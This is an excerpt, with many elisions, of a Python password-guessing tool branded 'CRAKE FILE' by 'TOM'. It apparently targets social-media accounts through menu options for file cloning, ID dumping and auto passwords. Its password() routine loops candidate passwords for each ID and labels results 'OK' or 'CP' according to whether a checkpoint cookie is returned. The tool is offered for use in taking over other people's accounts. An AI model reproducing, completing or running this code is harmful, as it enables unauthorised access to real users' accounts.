...
def banner():
	...
	print(f"""
             ...
             ⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⡿""")
	print('''           ╔════════════════════════╗
           ║ \033[1;35m[\033[1;32m+\033[1;35m]\033[1;37m TOOL      : CRAKE FILE ║  
           ║ \033[1;35m[\033[1;32m+\033[1;35m]\033[1;37m NAME      : TOM        ║
           ║ \033[1;35m[\033[1;32m+\033[1;35m]\033[1;37m CHANNEL   : @hwxdw     ║
           ║ \033[1;35m[\033[1;32m+\033[1;35m]\033[1;37m Telegram  : @T_0_M0    ║   
           ╚════════════════════════╝
           ''')
	print('')
def DUMPING():
	...
	banner()
	print('')
	print(' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mFILE CLONEING ')
	print('')
...
def menu():
	...
	print(' \033[1;35m[\033[1;32m0\033[1;35m] \033[1;37mEXIT ')
	print('')
	SALE = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mChoose : ')
	if SALE in ['1','01']:
		FILE()
	if SALE in ['2','02']:
		DUMPING()
...
def FILE():
	...
	try:
		...
		sol().print(win2)
		print('')
		sale = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mPut File  ')
...
def setting():
	...
	banner()
	print('')
	hu = input(' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mMIX IDS : ')
	print('')
	if hu in ['33','033']:
...
def passwrd():
	...
	hu = input(' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mAUTO PASSWORD : ')
	if hu in ['1','01']:
		password()
########################
def password():
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \033[1;37mTOM - CP : \033[1;93m{idf} | {pw} ')
				print('')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='TOM - CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='TOM - OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]TOM - OK[/bold green]'))
					ok+=1
					break
